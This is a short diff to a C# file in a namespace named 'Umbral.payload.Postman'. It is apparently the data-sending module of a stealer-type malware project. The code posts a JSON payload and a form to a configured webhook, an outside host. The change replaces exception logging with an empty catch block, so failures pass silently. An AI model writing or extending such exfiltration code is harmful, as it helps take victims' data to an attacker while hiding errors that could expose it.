@@ -32,15 +32,11 @@ namespace Umbral.payload.Postman
 
                         StringContent jsonContent = new StringContent(payload, Encoding.UTF8, "application/json");
                         await client.PostAsync(Settings.Webhook, jsonContent);
-
                         await client.PostAsync(Settings.Webhook, form);
                     }
                 }
             }
-            catch (Exception e)
-            {
-                Console.WriteLine(e);
-            }
+            catch { }
         }
     }
 }
